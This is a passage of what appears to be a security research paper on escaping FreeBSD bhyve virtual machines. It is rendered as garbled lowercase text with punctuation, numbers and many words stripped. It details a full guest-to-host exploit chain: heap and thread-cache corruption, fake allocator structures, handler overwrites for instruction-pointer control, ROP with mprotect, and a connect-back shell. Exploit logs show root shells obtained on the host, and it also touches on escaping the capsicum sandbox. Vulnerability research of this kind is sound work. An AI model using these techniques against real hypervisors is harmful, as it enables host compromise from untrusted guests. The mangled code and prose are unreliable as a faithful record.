set api registering modifying event main mevent thread handle event meventdispatch function called main dispatch respective event handler event reported two notable api interest exploitation bug meventadd meventdelete let see io port handler pmc us mevent library static int smicmdhandler struct vmctx ctx int vcpu int int port int byte eax void arg switch eax case bhyveacpienable powerbutton null powerbutton meventadd sigterm evfsignal powerbuttonhandler ctx oldpowerhandler signal sigterm sigign break case bhyveacpidisable powerbutton null meventdelete powerbutton powerbutton null signal sigterm oldpowerhandler break writing value bhyveacpienable trigger call meventadd meventc meventadd function allocates mevent structure using calloc event require addition update deletion maintained list pointed list head changehead element list doubly linked struct mevent meventadd int tfd enum evtype type void func int enum evtype void void param mevp calloc sizeof struct mevent mevp mefunc func mevp meparam param listinserthead changehead mevp melist struct mevent void mefunc int enum evtype void listentry mevent melist define listentry type struct struct type lenext next element struct type leprev address previous next element similarly writing value bhyveacpidisable trigger call meventdelete meventc meventdelete unlinks event list using listremove mark deletion mevent thread static int meventdeleteevent struct mevent evp int closefd listremove evp melist define listnext elm field elm fieldlenext define listremove elm field listnext elm field null listnext elm field fieldleprev elm fieldleprev elm fieldleprev listnext elm field summarize guest allocate deallocate mevent structure function list pointer allocation request serviced thread cache vcpu thread cpu affinity could set exploit code force allocation vcpu thread choice ie seen previous section corrupting tcaches structure would allow u control mevent structure get allocated corrupting tcaches structure tcaches structure array tcachebins structure tcachebins pointer void avail array pointer preallocated memory region service allocation request fixed size typedef struct tcaches tcachet struct tcaches struct tcachet qrenext tcachet qreprev link profaccumbytes tickert gcticker szindt nextgcbin tcachebint tbins struct tcachebins tcachebinstatst tstats int lowwater unsigned int lgfilldiv unsigned int ncached void avail seen section paper pseudomonarchia jemallocum possible return arbitrary address allocation corrupting thread cache ncached number cached free memory region available allocation allocation requested fetched avail ncached ncached get decremented likewise allocation freed ncached get incremented pointer added free list avail ncached ptr allocation request mevent structure size byte serviced tbin avail pointer vgasoftc bound read first leak heap memory including tcaches structure bound write used overwrite pointer free memory region pointed avail leaking rewriting memory make sure part memory thread cache corrupted specific needed overwrite tbins avail ncached pointer invoking meventadd side note event marked deletion meventdelete freed mevent thread thread hence freed pointer never make tbins avail array thread cache becomes available mevent thread cache calloc request made allocate mevent structure meventadd us overwritten pointer tcaches structure force mevent structure allocated arbitrary guestcontrolled address though mevent structure allocated arbitrary address control content written turn writeanythinganywhere order modify content mevent structure one solution allocate structure guest system memory mapped bhyve process since memory accessible guest content directly modified within guest solution allocate structure adjacent vgasoftc structure use bound write modify content later technique discussed section current approach determine tcaches structure leaked memory signaturebased search using tcaches definition implemented findjemalloctcache poc observed link pointer qrenext qreprev pagealigned since tcaches allocation pagealigned moreover valid pointer tbins index avail used signature possible tcaches structure located memory tbins avail pointer fetched analysis next part approach locate array pointer memory tbins avail point searching sequence value varying mevent allocation size offset avail pointer array vgasoftc structure known precisely overwrite tbin avail ncached return arbitrary address vgasoftc address roughly calculated tbins avail number entry avail sizeof void offset avail array vgasoftc structure tcachecreate function tcachec give clear understanding tcaches allocation avail pointer assignment tcachet tcachecreate tsdnt tsdn arenat arena size offsetof tcachet tbins sizeof tcachebint nhbins naturally align pointer stack size ptrceiling size stackoffset size size stacknelms sizeof void avoid false cacheline sharing size size cacheline tcache ipallocztm tsdn size cacheline true null true arenaget tsdnnull true nhbins tcache tbins lgfilldiv stackoffset tcachebininfo ncachedmax sizeof void avail point past available space allocation access slot toward higher address benefit prefetch tcache tbins avail void uintptrt tcache uintptrt stackoffset return tcache technique locate tcaches structure lot scope improvement study term signature used leaking tcaches base address directly link pointer qrenext qreprev discovering base address guest memory leaking baseaddr allows guest set shared memory guest host bhyve process knowing guest physical address memory allocation host virtual address guest allocation calculated baseaddr guest physical address fake data structure payload could injected bhyve process memory using shared memory guest due memory layout observed section leak least one pointer within jemalloc chunk guest memory page case base address chunk calculated jemalloc freebsd us chunk size mb aligned size macro jemalloc calculates base address chunk given pointer chunk define void uintptrt chunksizemask chunksizemask chunksize chunksize chunk base address known base address guest memory calculated chunk base address chunk size vmmmapguardsize another way get base address leaking vmctx structure lower memory chunk discussed part section bound write write pointer anywhere using unlink guest allocates mevent structure within system memory overwrite powerbuttonhandler callback wait host turn vm sigterm signal delivered bhyve process poweroff turn trigger overwritten handler giving rip control however approach drawback guest need wait vm powered host eliminate host interaction next idea use list unlink corrupting previous next pointer list write arbitrary value arbitrary address using listremove meventdeleteevent section major limitation approach value written also writable address hence function pointer directly overwritten ability write writable address arbitrary address next step find target overwrite control rip indirectly mmio emulation rip control methodology pci hole memory region guest memory section mapped used device emulation access memory trigger extended page table ept fault resulting vmexit vmxexitprocess vmm code invokes respective handler based vmexit reason static int vmxexitprocess struct vmx vmx int vcpu struct vmexit vmexit case exitreasoneptfault gpa lie within address space allocated memory must nested page fault otherwise must instruction access mmio space gpa vmcsgpa vmmemallocated vmx vm vcpu gpa apicaccessfault vmx vcpu gpa vmexit exitcode vmexitcodepaging else eptemulationfault qual vmexitinstemul vmexit gpa vmcsgla vmmstatincr vmx vm vcpu vmexitinstemul vmexitinstemul set exit code vmexitcodeinstemul exit detail emulation vmrun ioctl used run virtual machine call vmhandleinstemul check guest physical address gpa accessed emulated inkernel exit information passed user space emulation int vmrun struct vm vm struct vmrun vmrun case vmexitcodeinstemul error vmhandleinstemul vm vcpuid retu break mmio emulation user space done vmexit handler vmexitinstemul bhyverunc vmloop dispatch execution respective handler based exit code static void vmloop struct vmctx ctx int vcpu startrip error vmrun ctx vcpu vmexit vcpu exitcode vmexit vcpu exitcode rc handler exitcode ctx vmexit vcpu vcpu static vmexithandlert handler vmexitcodemax vmexitcodeinstemul vmexitinstemul user space device emulation interesting exploit right data structure corrupt using list unlink memory range callback user space device emulation stored redblack tree pci bar programmed map mmio region using registermem memory region registered explicitly registermemfallback memc information added mmiorbroot mmiorbfallback rb tree respectively instruction emulation redblack tree traversed find node handler guest physical address caused ept fault redblack tree node defined structure mmiorbrange memc struct mmiorbrange rbentry mmiorbrange mrlink rb tree link struct memrange mrparam mrbase mrend mrbase element starting address memory range mrend mark ending address memory range memrange structure defined memh pointer handler argument along argument typedef int memfunct struct vmctx ctx int vcpu int dir addr int size val void long struct memrange const char name int flag memfunct handler void long base size avoid redblack tree lookup time instruction emulation pervcpu mmio cache used since access vcpu consecutive address device memory range result redblack tree lookup maintained array mmiohint emulatemem called vmexitinstemul first mmio cache looked see entry yes guest physical address checked mrbase mrend value validate cache entry expected entry cache miss redblack tree traversed find correct entry entry found vmmemulateinstruction common code user space vmm called emulation static struct mmiorbrange mmiohint vmmaxcpu int emulatemem struct vmctx ctx int vcpu paddr struct vie vie struct vmguestpaging paging mmiohint vcpu paddr mmiohint vcpu mrbase paddr mmiohint vcpu mrend entry mmiohint vcpu else entry null entry null mmiorblookup mmiorbroot paddr entry update pervcpu cache mmiohint vcpu entry else mmiorblookup mmiorbfallback paddr entry err vmmemulateinstruction ctx vcpu paddr vie paging memread memwrite entry mrparam vmmemulateinstruction call instruction specific handler like emulatemovx emulatemovs etc based opcode type wrapper memread memwrite memc call registered handler corresponding memrange structure virtual device int vmmemulateinstruction void vm int vcpuid gpa struct vie vie struct vmguestpaging paging memregionreadt memread memregionwritet memwrite void memarg switch vie opoptype case vieoptypemovzx error emulatemovx vm vcpuid gpa vie memread memwrite memarg break static int emulatemovx void vm int vcpuid gpa struct vie vie memregionreadt memread memregionwritet memwrite void arg switch vie opopbyte case error memread vm vcpuid gpa val arg static int memread void ctx int vcpu gpa rval int size void arg int error struct memrange mr arg error mr handler ctx vcpu memfread gpa size rval mr mr return error static int memwrite void ctx int vcpu gpa wval int size void arg int error struct memrange mr arg error mr handler ctx vcpu memfwrite gpa size wval mr mr return error overwriting mmiohint ie cache guest control entire mmiorbrange structure lookup mmio emulation guest gain control rip call memread memwrite since mr handler point arbitrary value corrupted handler mr handler take argument total last two argument mr mr therefore get pushed stack give control stack could used stack pivot summary corrupt jemalloc thread cache use acpi event handling allocate mevent structure guest modify list pointer delete event trigger unlink use unlink overwrite mmiohint gain control rip v mmiohint mmiohint heap guest memory huge page mevent vgasoftc tcaches next v previous fake mmiorbrange possible derive address mmiohint allocated bs segment leaking powerbuttonhandler function address section mevent structure due lack pie aslr hardcoded address mmiohint directly used proof concept exploit code faking arenachunks structure arbitrary free meventdelete jemalloc free pointer part allocator managed memory mevent structure allocated guest system memory corrupting tcache structure section result segmentation fault unless fake arenachunks structure set free freeing arbitrary pointer already discussed research however take second look exploitation bug jemallocalwaysinline void arenadalloc tsdnt tsdn void ptr tcachet tcache bool slowpath arenachunkt chunk sizet pageind mapbits chunk arenachunkt ptr likely chunk ptr pageind uintptrt ptr uintptrt chunk lgpage mapbits arenamapbitsget chunk pageind assert arenamapbitsallocatedget chunk pageind likely mapbits chunkmaplarge small allocation likely tcache null szindt binind arenaptrsmallbinindget ptr mapbits tcachedallocsmall tsdntsd tsdn tcache ptr binind slowpath request free pointer handled arenadalloc arenah jemalloc macro get chunk address pointer freed arenachunks header dynamically sized mapbits array hold property page within chunk arena chunk header struct arenachunks extentnodet node map page within chunk keep track freelargesmall first mapbias entry omitted since chunk header need tracked map omission save header page common chunk size eg mib arenachunkmapbitst mapbits dynamically sized page index pageind arenadalloc pointer freed calculated used index mapbits array arenachunks structrue done using arenamapbitsget get mapbits value series call invoked arenamapbitsget arenamapbitsget arenamapbitspgetconst arenamapbitspgetmutable arenabitselmgetmutable jemallocalwaysinline arenachunkmapbitst arenabitselmgetmutable arenachunkt chunk sizet pageind return chunk mapbits pageindmapbias mapbias variable defines number page used chunk header need tracking omitted mapbias value calculated arenaboot arenac file whose value case arenaptrsmallbinindget get bin index binind encoded mapbits value arenachunks structure information fetched tcachedallocsmall longer us arena chunk header relies information threadspecific data thread cache structure hence essential part fake arenachunks structure mapbits set way pageind mapbias calculation arenabitselmgetmutable point entry mapsbits array index value valid tcache bin case index set ie bin handling region size byte since mapbias page usable page could placed fake header page elegant way achieve request chunk size contiguous memory guest get allocated part guest system allocating contiguous virtual memory guest result contiguous virtual memory allocation host force allocation contiguous guest bhyve host process request memory using mmap allocate huge page maphugetlb flag set exploitc sharedgva mmap mb protread protwrite maphugetlb mapprivate mapanonymous mappopulate sharedgpa gvatogpa sharedgva sharedhva baseaddress sharedgpa setting fake jemalloc chunk arenachunk struct arenachunks sharedgva set bin index also dont set chunkmaplarge arenachunk mapbits bit chunkmapbinindshift calculate address pageind mapbias point tcache bin size ie index faketbinhva sharedhva mapbias faketbingva sharedgva mapbias heap guest memory guard huge page vgasoftc tcaches page fake mevent arenachunks arbitrary pointer freed overwrite mmiohint using meventdelete without segmentation fault jemalloc version used freebsd check pageind mapbias unlike one seen android hence fake chunk also set single page like arenachunk struct arenachunks sharedgva arenachunk mapbits mapbias bit chunkmapbinindshift faketbinhva sharedhva sizeof struct arenachunks faketbingva sharedgva sizeof struct arenachunks since address freed part page chunk header pageind value would chunk mapbits pageindmapbias arenabitselmgetmutable would end accessing extentnodet node element arenachunks structure since pageindmapbias negative one set bin index successful free code execution using mmio vcpu cache mmio cache mmiohint overwritten meventdelete pointer fake mmiorbrange structure fake structure set like exploitc pciemulfallbackhandler return without error mmiorangegva mrparamhandler void pciemulfallbackhandler mmiorangegva void corrupted mevent delete mmiorangegva fake rsp value rop fix later mmiorangegva mrparambase mmiorangegva mrparamsize mmiorangegva mrparamflags mmiorangegva mrend mrbase value set mrend set ie entire range physical address hence mmio access guest end using fake mmiorbstructure emulatemem int emulatemem struct vmctx ctx int vcpu paddr struct vie vie struct vmguestpaging paging mmiohint vcpu paddr mmiohint vcpu mrbase paddr mmiohint vcpu mrend entry mmiohint vcpu entire range physical address used valid mmio access address outside range fake mrbase mrend exploit trigger mmio access end updating mmiohint cache mmiohint overwrite becomes useless side effect unlink operation meventdelete corrupted necessary make sure corrupted value used mmio access exploit trigger ensure setup mrparamhandler pointer function returning ie success returning value would trigger error emulation leading abort vmloop bhyverunc ideal choice turned pciemulfallbackhandler defined pciemulc static int pciemulfallbackhandler struct vmctx ctx int vcpu int dir addr int size val void long ignore writes return read mem read code take care truncating correct size dir memfread val return overwriting mmiohint mrparamhandler need fixed continuing exploitation first overwrite address pop rsp ret gadget overwrite mrparamhandler address pop register ret gadget make sure gadget triggered corrupted value mmio access point fake stack rop payload fake handler executed mmio access pop register ret pop saved rip return pop rsp gadget pop rsp pop fake stack pointer executes rop payload exploitc fix mmio handler mmiorangegva mrparamhandler void poprbp mmiorangegva void poprsp mmiorangegva rop mmio mapphyaddress getpagesize mmio running vm escape exploit give connect back shell guest following output root linuxguest setupavgafakearenaexploit exploit exploit cpu affinity set exploit reading bhyve process memory exploit leaked tcache avail pointer exploit leaked tbin avail pointer exploit offset tbin avail pointer exploit leaked vgasoftc exploit guest base address exploit disabling acpi shutdown free mevent struct exploit shared data structure mapped exploit overwriting tbin avail pointer exploit enabling acpi shutdown reallocate mevent struct exploit leaked text powerbuttonhandler address exploit modifying mevent structure next previous pointer exploit disabling acpi shutdown overwrite mmiohint using fake mevent struct exploit preparing connect back shellcode exploit shared payload mapped exploit triggering mmio read trigger payload root linuxguest setupavgafakearenaexploit renorobert linuxguest nc vvv l listening family port connection port tcp accepted family sport uname freebsd freebsd thu sep utc root usrobjusrsrcsysgeneric exploitation strategy section detail way exploit bug corrupting structure used io port emulation pci config space emulation allocating region another size class free section detail setting fake arena chunk header free arbitrary pointer call meventdelete however alternate way achieve allocating mevent structure part existing thread cache allocation address vgasoftc structure calculated described section leaking tbins avail pointer main mevent thread allocates vgasoftc structure part bin handling region size byte overwriting tbin avail ncached pointer thread address region adjacent vgasoftc structure force mevent structure allocated thread allocated part memory managed mevent thread since mevent structure allocated vgasoftc structure bound write used overwrite next previous pointer used unlinking free existing chunk header bin servicing region size used allowing successful free without crashing general jemalloc allows freeing pointer within allocated run pmio emulation corrupting inouthandlers structure understanding portmapped io emulation bhyve provides powerful primitive exploiting vulnerability section see leveraged accessing part heap memory previously accessible vm exit caused io access invokes vmexitinout handler bhyverunc vmexitinout call emulateinout inoutc emulation io port handler device specific information maintained array inouthandlers structure defined inoutc define maxioports static struct const char name int flag inoutfunct handler void arg inouthandlers maxioports virtual device register callback io port calling registerinout inoutc populates inouthandlers structure int registerinout struct inoutport iop iop port iop port iop size inouthandlers name iop name inouthandlers flag iop flag inouthandlers handler iop handler inouthandlers arg iop arg emulateinout function us information inouthandlers invoke respective registered handler int emulateinout struct vmctx ctx int vcpu struct vmexit vmexit int strict byte vmexit uinoutbytes vmexit uinoutin port vmexit uinoutport handler inouthandlers port handler flag inouthandlers port flag arg inouthandlers port arg retval handler ctx vcpu port byte val arg overwriting arg pointer inouthandlers structure could provide interesting primitive case vga emulation register io port handler vgaporthandler defined vgac port range vgasoftc structure arg void vgainit int ioonly sc calloc sizeof struct vgasoftc bzero iop sizeof struct inoutport iopname vga port vgaioportstart port vgaioportend port iopport port iopsize iopflags ioportfinout iophandler vgaporthandler ioparg sc error registerinout iop assert error going back patch section noticed dacrdindex dacrdsubindex dacwrindex dacwrsubindex signed integer hence overwriting arg pointer address fake vgasoftc structure heap dacrdindexdacwrindex set negative value guest access memory dacpalette array specifically arg pointer dacdataport need overwritten since handle read write access dacpalette array exploitc setup fake vgasoftc structure memset vgasoftc sizeof struct vgasoftc chunkhioffset vgasoftcbins getoffset struct vgasoftc vgadacdacpalette set value reading heap chunk vgasoftcvgadacdacrdsubindex chunkhioffset vgasoftcvgadacdacwrsubindex chunkhioffset therefore instead overwriting mmiohint using meventdelete unlink exploit overwrites arg pointer io port handler gain access part heap earlier reachable linear bound access hardcoded address inouthandlers structure used exploit code done mmiohint previously due lack pie aslr offset start chunk fake vgasoftc structure vgadacdacpalette calculated using jemalloc macro inouthandlers inouthandlers inouthandlers overwrite overwrite heap v v mevent real next fake tcaches vgasoftc vgasoftc previous region region region corrupting inouthandlers structure also leveraged full process rw described later section leaking vmctx structure section detail advantage leaking guest system base address exploitation elegant way achieve leaking vmctx structure hold pointer baseaddr guest system memory vmctx structure defined libvmmapivmmapic get initialized vmsetupmemory seen section struct vmctx int fd lowmemlimit int memflags sizet lowmem sizet highmem char baseaddr char name reading jemalloc chunk using dacdataport setting fake vgasoftc structure vmctx structure along baseaddr pointer leaked guest overwriting mmio redblack tree node rip control overwriting arg pointer dacdataport port fake vgasoftc structure open opportunity overwrite many callback mmiohint gain rip control however overwriting mmio callback still nice option since provides way control stack stack pivot detailed section instead overwriting mmiohint guest directly overwrite specific redblack tree node used mmio emulation ideal choice turn node mmiorbfallback tree handling access memory allocated system memory pci device part memory frequently accessed overwriting affect guest operation locate redblack tree node search address function pciemulfallbackhandler heap registered call initpci function defined pciemulc int initpci struct vmctx ctx lowmem vmgetlowmemsize ctx bzero mr sizeof struct memrange mrname pci hole mrflags memfrw memfimmutable mrbase lowmem mrsize lowmem mrhandler pciemulfallbackhandler error registermemfallback mr gain rip control like mmiohint technique overwrite handler access memory allocated system memory pci device output full working exploit root linuxguest setupavgaioportexploit exploit exploit cpu affinity set exploit reading bhyve process memory exploit leaked tcache avail pointer exploit leaked tbin avail pointer exploit offset tbin avail pointer exploit leaked vgasoftc exploit disabling acpi shutdown free mevent struct exploit overwriting tbin avail pointer exploit enabling acpi shutdown reallocate mevent struct exploit writing fake vgasoftc mevents heap exploit trigerring unlink overwrite io handler exploit reading chunk data exploit guest baseaddr vmctx exploit preparing connect back shellcode exploit shared memory mapped exploit writing fake memrange red black tree exploit triggering mmio read trigger payload root linuxguest setupavgaioportexploit renorobert linuxguest nc vvv l listening family port connection port tcp accepted family sport uname freebsd freebsd thu sep utc root usrobjusrsrcsysgeneric using pci bar decoding rip control technique discussed far depends smi handler ability allocate free memory ie unlinking mevent structure section discus another way allocatedeallocate memory using pci config space emulation explore way exploit bug without running jemalloc arbitrary free issue bhyve emulates access config space address port config space data port using pciemulcfgaddr pciemulcfgdata defined pciemulc pciemulcfgdata call pcicfgrw handling rw access pci configuration space interesting part emulation exploitation bug access command register static void pcicfgrw struct vmctx ctx int vcpu int int bus int slot int func int coff int byte eax else coff pcircommand coff pcirrevid pciemulcmdstswrite pi coff eax byte pci command register offset byte config space header command register accessed pciemulcmdstswrite invoked handle access static void pciemulcmdstswrite struct pcidevinst pi int coff new int byte cmd pi pcircommand stash old value cfgwrite pi coff new byte update config pi pcircommand get updated value changed cmd pcibarmax switch pi pibar type case case mmio address space decoding changed changed pcimcmdmemen memen pi registerbar pi else unregisterbar pi bit command register specifies device respond io space access bit specifies device respond memory space access bit unset respective bar unregistered bar registered using registerbar unregistered using unregisterbar modifybarregistration pciemulc invoked registering unregistering bar mapping io space address involves modifying inouthandlers array interestingly registering unregistering bar mapping memory space address involves allocation deallocation heap memory memory range registered mmio emulation get added mmiorbroot redblack tree let u consider case framebuffer device allocates memory bar pcifbufinit function defined pcifbufc static int pcifbufinit struct vmctx ctx struct pcidevinst pi char opts pi pcirdevice pi pcirvendor error pciemulallocbar pi dmemsz assert error error pciemulallocbar pi fbsize series call made bar allocation look like pciemulallocbar pciemulallocpbar registerbar modifybarregistration registermem registermemint static void modifybarregistration struct pcidevinst pi int idx int registration switch pi pibar idx type case case bzero mr sizeof struct memrange mrname pi piname mrbase pi pibar idx addr mrsize pi pibar idx size registration error registermem mr else error unregistermem mr registermemint unregistermem memc handle actual allocation deallocation registration mmiorbrange structure allocated get added redblack tree unregister node get freed using rbremove static int registermemint struct mmiorbtree rbt struct memrange memp mrp malloc sizeof struct mmiorbrange mrp null mmiorblookup rbt memp base entry err mmiorbadd rbt mrp int unregistermem struct memrange memp err mmiorblookup mmiorbroot memp base entry err rbremove mmiorbtree mmiorbroot entry hence disabling memory space decoding pci command register possible free mmiorbrange structure associated device also reenabling memory space decoding mmiorbrange structure allocated operation also triggered writing pci bar call updatebaraddress pciemulc however unregisterbar registerbar called together part write operation pci bar unlike independent event enabling disabling bar decoding command register mmiorbrange structure size byte serviced bin size byte bar unregistered writing command register pointer freed memory pushed avail pointer thread cache structure allocate mmiorbrange structure framebuffer device address controlled guest overwrite cached pointer tbins avail array address guest memory detailed section reenable memory space decoding state heap framebuffer bar freed gdb info thread id target id frame lwp process mevent kevent lwp process umtxoperr lwp process vcpu ioctl lwp process vcpu ioctl gdb thread switching thread lwp process ioctl gdb xgx gdb print struct tcaches tbins tstats nrequests lowwater lgfilldiv ncached avail gdb technique entirely skip jemalloc arbitrary free since meventdelete used guest directly modify handler element mmiorbrange structure modified access memory mapped framebuffer device gain rip control output proof concept code root linuxguest setupavgapciexploit exploit exploit cpu affinity set exploit writing pci command register free memory exploit reading bhyve process memory exploit leaked tcache avail pointer exploit offset tbin avail pointer exploit guest base address exploit shared data structure mapped exploit overwriting tbin avail pointer exploit writing pci command register reallocate freed memory exploit triggering mmio read rip control root gdb q p attaching process reading symbol usrsbinbhyve reading symbol usrlibdebugusrsbinbhyvedebug done done gdb c continuing thread vcpu received signal sigbus bus error switching lwp process memread usrsrcusrsbinbhyvememc file directory gdb xi rip callq gdb px note rop payload process continuation rop payload used exploit performs following operation clear mmiohint setting null fake structure mmiorbrange structure used forever guest mmio access save address pointing stack use later process continuation leak address syscall gadget libc reading got entry ioctl call use making syscall call mprotect make guestcontrolled memory rwx executing shellcode jump connect back shellcode set rax returning hijacked function call treated error emulation abort called ie process continuation restore stack using saved stack address process continuation memread called rval argument passed pointer stack variable static int memread void ctx int vcpu gpa rval int size void arg int error struct memrange mr arg error mr handler ctx vcpu memfread gpa size rval mr mr return error per calling convention rval value present register rop payload start executing invocation mr handler instruction sequence memwrite provides nice way save register value controlling rbp value saved value used return original call stack without crashing bhyve process mov rbp mov mov rbp mov rsp mov rsp mov rbp callq concludes first part paper exploiting vga memory corruption bug vulnerability firmware configuration device firmware configuration device fwctl allows guest retrieve specific host provided configuration like vcpu count initialization device enabled bhyve guest configured use bootrom uefi firmware fwctlc implement device using requestresponse messaging protocol io port messaging protocol us state dormant identwait identsend req resp operation dormant state device initialization identwait state device initialized calling fwctlinit identsend device move state guest writes word io port req final stage initial handshake read byte byte io port signature bhyv returned guest move device req state byte read device req state guest request configuration information resp guest request complete device move resp state state device service request go back req state handling next request interesting state req resp device performs operation using guest provided input guest request handled function fwctlrequest static int fwctlrequest value switch rinforeqcount case rinforeqsize value case rinforeqtype value rinforeqcount break case rinforeqtxid value rinforeqcount ret fwctlrequeststart break default ret fwctlrequestdata value guest set value rinforeqsize request count rinforeqcount request guest rinforeqcount incremented messaging protocol defines set operation opnull opecho opget opgetlen opset opget opgetlen supported currently request type operation rinforeqtype could set either required information received fwctlrequeststart validates request static int fwctlrequeststart void rinforeqop erropinfo rinforeqtype opmax ops rinforeqtype null rinforeqop ops rinforeqtype err rinforeqop opstart rinforeqsize err erropset err rinforeqop erropinfo reqop opstart call fgetstart validate rinforeqsize provided guest detailed define fgetstrsz static int fgetstart int len len fgetstrsz return static struct reqinfo reqsize reqtype reqtxid rinfo reqsize element reqinfo structure defined unsigned integer fgetstart defines argument len signed integer thus large unsigned integer bypass validation len fgetstrsz signed integer comparison performed fwctlrequest call fwctlrequestdata successful validation fwctlrequeststart static int fwctlrequestdata value rinforeqsize sizeof rinforeqop opdata value remlen rinforeqsize sizeof fwctlrequestdone return return rinforeqop opdata call fgetdata store guest data array static char fgetstr fgetstrsz static void fgetdata data int len fgetstr fgetcnt data fgetcnt sizeof fwctlrequestdata decrement rinforeqsize byte request read rinforeqsize sizeof fgetcnt used index fgetstr array get increment byte request since rinforeqsize set large value fgetcnt incremented beyond fgetstrsz overwrite memory adjacent fgetstr array outofbound write bs segment since byte data much read device transitioned resp state rinforeqsize sizeof however state transition requirement exploiting bug exploitation fwctl bug sake simplicity setup enable fwctl device default even bootrom specified patch applied bhyve running freebsd host bhyveruncorig bhyverunc assert error lpcbootrom fwctlinit fwctlinit ifndef withoutcapsicum bhyvecaphcachecatpages rest section detail memory layout technique convert outofbound write full process rw analysis memory layout bs segment unlike heap memory adjacent fgetstr deterministic layout since allocated bs segment moreover freebsd aslr pie help exploitation bug following memory layout observed test environment char fgetstr struct sizet fsz fdata fgetbuf padding struct iovec fgetbiov sizet fgetsize padding struct inouthandlers handler struct mmiorbrange mmiohint vmmaxcpu guest able overwrite everything beyond fgetstr array corrupting fsz fgetsize interesting name sound first interesting target array iovec structure since pointer iovbase length iovlen get used resp state device struct iovec void iovbase sizet iovlen however device never reach resp state due large value rinforeqsize next interesting target array inouthandlers structure fgetstr fgetbuf inouthandlers mmiohint bound write full process rw corrupting inouthandlers structure provides useful primitive exploitation already detailed section vga exploit corrupting arg pointer vga io port allows guest access memory relative arg pointer accessing dacpalette array section describes full process rw achieved let analyze access pci io space bar emulated bhyve done using pciemuliohandler pciemulc static int pciemuliohandler struct vmctx ctx int vcpu int int port int byte eax void arg struct pcidevinst pdi arg struct pcidevemu pe pdi pid offset port pdi pibar addr eax pe pebarread ctx vcpu pdi offset byte else pe pebarwrite ctx vcpu pdi offset byte eax arg pointer pcidevinst structure hold pcibar structure pointer pcidevemu structure structure defined pciemulh struct pcidevinst struct pcidevemu pid void piarg devemuprivate data uchar picfgdata pciregmax struct pcibar pibar pcibarmax pcidevemu structure callback specific virtual device callback interest section pebarwrite pebarread used handling writes read bar mapping io memory space struct pcidevemu char peemu name device emulation bar readwrite callback void pebarwrite struct vmctx ctx int vcpu struct pcidevinst pi int baridx offset int size value pebarread struct vmctx ctx int vcpu struct pcidevinst pi int baridx offset int size pcibar structure store information type address size bar struct pcibar enum pcibartype type io memory size addr overwriting inouthandlers handler pointer pciemuliohandler arg pointer fake pcidevinst structure possible control call pe pebarread pe pebarwrite argument pi offset value next part analysis find pebarwrite pebarread callback useful full process rw bhyve dummy pci device initialized pciemulc suit purpose define diosz define dmemsz struct pciemuldsoftc ioregs diosz memregs dmemsz static void pciemuldiow struct vmctx ctx int vcpu struct pcidevinst pi int baridx offset int size value int struct pciemuldsoftc sc pi piarg size sc ioregs offset value else size sc ioregs offset value else size sc ioregs offset value static pciemuldior struct vmctx ctx int vcpu struct pcidevinst pi int baridx offset int size struct pciemuldsoftc sc pi piarg size value sc ioregs offset else size value sc ioregs offset else size value sc ioregs offset pciemuldiow pciemuldior pebarwrite pebarread callback dummy device since pcidevinst structure fake pi piarg could set arbitrary value read write ioregs memregs could access memory relative arbitrary address set pi piarg guest overwrite inouthandlers structure detailed access io port trigger memory read write relative fake piarg though good enough exploit bug still full process arbitrary rw order access multiple address choice multiple fake pcidevinst structure need created ie io port fake piarg pointer address x io port fake pointer piarg address representation fake fake pcidevinst fi pcidevemu pid pd pebarread fe piarg pa pebarwrite fake inouthandlers io arg fake structure fgetbuf v v v fi fi fi n fgetstr pd pd pd io io io n fe pa pa pa v address x v address v address n instead guest could create fake pcidevinst structure corrupting inouthandlers structure io port first piarg could point address fgetcnt fgetdata writes data fgetstr array using fgetcnt index since fgetcnt control relative write fgetstr used modify second piarg memory adjacent fgetstr idea perform following corrupt inouthandlers piarg pcidevinst structure point fgetcnt corrupt inouthandlers piarg pcidevinst initially set null set fgetcnt value using io port fgetstr fgetcnt point piarg io port use fwctl write operation set piarg io port arbitrary address use io port read write address set previous step step could repeated perform read write anywhere memory alternatively inouthandlers could also set write directly piarg io port fake structure fgetbuf v v fi fi fgetcnt fgetstr pd pd io io fe pa pa fi piarg point fgetcnt set index fgetstr fgetcnt point fi piarg v arbitrary rw guest could reuse technique used vga exploit rip rsp control attached exploit code us mmiohint overwrite sandbox escape using pci passthrough bhyve added support capsicum sandbox change addition capsicum huge security improvement large number syscalls filtered code execution bhyve limited sandboxed process user space process enters capability mode performing initialization main function bhyverunc int main int argc char argv ifndef withoutcapsicum capenter errno enosys errx exoserr capenter failed endif sandbox specific code bhyve wrapped within preprocessor directive withoutcapsicum one also build bhyve without capsicum support needed searching withoutcapsicum codebase give fair understanding restriction imposed bhyve process sandbox reduces capability open file descriptor using caprightslimit file descriptor capioctl capability capioctlslimit used whitelist allowed set ioctls however virtual device interact kernel driver host bug whitelisted ioctl command could allow code execution context host kernel attack surface dependent virtual device enabled guest vm descriptor opened initialization another interesting attack surface vmm vmm kernel module bunch ioctl command reachable default within sandbox section detail couple sandbox escape pci passthrough implementation bhyve pci passthrough bhyve allows guest vm directly interact underlying hardware device exclusively available use however exception guest allowed modify bar register directly read write access bar msi capability register pci configuration space emulated pci passthrough device initialized using passthruinit function pcipassthruc passthruinit call cfginit initialize msi bar pci using cfginitmsi cfginitbar respectively cfginitbar allocates bar guest address space using pciemulallocpbar map physical bar address guest address space using vmmappptdevmmio static int cfginitbar struct vmctx ctx struct passthrusoftc sc pcibarmax ioctl pcifd pciocgetbar bar cache information real bar sc pscbar type bartype sc pscbar size size sc pscbar addr base allocate bar guest io mmio space error pciemulallocpbar pi base bartype size msix table need special handling pcimsixtablebar pi error initmsixtable ctx sc base else bartype pcibario map physical bar guest mmio space error vmmappptdevmmio ctx sc pscselpcbus sc pscselpcdev sc pscselpcfunc pi pibar addr pi pibar size base vmmappptdevmmio api part libvmmapi library defined vmmapic call vmmappptdevmmio ioctl command create mapping host memory guest address space ioctl requires bus slot func detail passthrough device guest physical address gpa host physical address hpa parameter int vmmappptdevmmio struct vmctx ctx int bus int slot int func vmpaddrt gpa sizet len vmpaddrt hpa pptmmiogpa gpa pptmmiolen len pptmmiohpa hpa return ioctl ctx fd vmmappptdevmmio pptmmio bar msix table msix pending bit array pba handled differently memory io bar msix table directly mapped guest address space emulated msix table msix pba could use two separate bar could mapped bar mapped bar msix structure could also end sharing page though offset overlap msix emulation considers condition msix table exclusively map bar msix table msix pba map bar msix table msix pba map bar share page interesting case sandbox escape emulation msix table msix pba share page let take closer look initmsixtable static int initmsixtable struct vmctx ctx struct passthrusoftc sc base pi pimsixpbabar pi pimsixtablebar pba overlap either first last page msix table region map appropriate page pbaoffset tableoffset pi pimsixpbapageoffset 